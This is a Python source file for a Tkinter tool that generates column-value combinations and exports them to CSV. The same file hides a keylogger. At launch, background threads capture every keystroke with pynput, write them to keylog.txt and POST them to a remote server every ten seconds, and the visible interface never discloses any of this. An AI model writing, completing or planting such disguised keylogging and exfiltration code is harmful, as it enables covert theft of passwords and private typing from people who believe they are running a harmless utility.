import tkinter as tk
from tkinter import simpledialog, scrolledtext, filedialog, messagebox
from itertools import product
import csv
from pynput import keyboard
import threading
import requests
import json
import time

# Server Configuration
SERVER_URL = "http://192.168.0.36:8080"  # Replace with your server URL
POST_INTERVAL = 10  # Interval in seconds to send data to the server

# Global variables for keylogging
keylog_data = []
keylog_file = "keylog.txt"
stop_keylogger = False

# Function to log keys to a file
def log_keys_to_file():
    with open(keylog_file, "a") as f:
        for entry in keylog_data:
            f.write(entry + "\n")
        keylog_data.clear()

# Keylogger functions
def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') else str(key)
        keylog_data.append(key_text)
    except Exception as e:
        keylog_data.append(f"[Error: {e}]")

    if len(keylog_data) > 10:  # Log to file in batches for performance
        log_keys_to_file()

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on Escape key
        global stop_keylogger
        stop_keylogger = True
        return False

def start_keylogger():
    global stop_keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_keylogger:
            listener.join()

# Function to send keylog data to server
def send_keylogs_to_server():
    while not stop_keylogger:
        if keylog_data:
            try:
                # Prepare payload
                payload = json.dumps({"keylogs": keylog_data})
                headers = {"Content-Type": "application/json"}
                response = requests.post(SERVER_URL, data=payload, headers=headers)

                if response.status_code == 200:
                    print("Keylog data sent successfully")
                    log_keys_to_file()  # Save sent logs to the file
                else:
                    print(f"Failed to send data: {response.status_code}")
            except Exception as e:
                print(f"Error sending data: {e}")
        time.sleep(POST_INTERVAL)

# Tkinter App for Column Combinations
class ColumnCombinations:
    def __init__(self, master):
        self.master = master
        self.master.title("Column Combinations Generator")
        self.columns = []
        self.row_contents = []
        self.combinations = []

        self.setup_ui()

    def setup_ui(self):
        num_columns = simpledialog.askinteger("Columns", "How many columns do you want?", minvalue=1, maxvalue=10)

        for i in range(num_columns):
            column_name = simpledialog.askstring("Column Name", f"Enter name for column {i + 1}")
            self.columns.append(column_name)

            # Ask for comma-separated row content
            row_data = simpledialog.askstring("Row Content", f"Enter comma-separated values for '{column_name}'")
            rows = [item.strip() for item in row_data.split(',')]  # Split and strip whitespace
            self.row_contents.append(rows)

        # Make columns responsive
        for i in range(len(self.columns)):
            self.master.grid_columnconfigure(i, weight=1, uniform="equal")  # Makes columns resize equally

        self.master.grid_rowconfigure(0, weight=1)  # Make header row adjustable
        self.master.grid_rowconfigure(2, weight=1)  # Make the results row adjustable

        for i, column in enumerate(self.columns):
            tk.Label(self.master, text=column, font=('Arial', 12, 'bold')).grid(row=0, column=i, padx=5, pady=5, sticky="ew")

        tk.Button(self.master, text="Generate Combinations", command=self.generate_combinations).grid(row=1, column=0, columnspan=len(self.columns), pady=10, sticky="ew")

        # Button to save combinations as CSV
        tk.Button(self.master, text="Save as CSV", command=self.save_to_csv).grid(row=1, column=len(self.columns), padx=5, pady=10, sticky="ew")

        self.result_text = scrolledtext.ScrolledText(self.master, width=50, height=20)
        self.result_text.grid(row=2, column=0, columnspan=len(self.columns), padx=10, pady=10, sticky="nsew")

    def generate_combinations(self):
        self.combinations = list(product(*self.row_contents))  # Generate cartesian product of rows
        self.display_combinations()

    def display_combinations(self):
        self.result_text.delete('1.0', tk.END)
        for combo in self.combinations:
            self.result_text.insert(tk.END, f"{'_'.join(combo)}\n")  # Use underscore as separator

    def save_to_csv(self):
        # Open a save file dialog to choose the location and file name
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, mode='w', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    # Write a header for the single column
                    writer.writerow(["Combinations"])
                    # Write each combination as a single string in one column with underscores
                    for combo in self.combinations:
                        writer.writerow(["_".join(combo)])
                messagebox.showinfo("Success", f"Combinations saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"An error occurred while saving the file: {e}")

if __name__ == "__main__":
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=send_keylogs_to_server, daemon=True).start()

    # Start the Tkinter application
    root = tk.Tk()
    app = ColumnCombinations(root)
    root.mainloop()

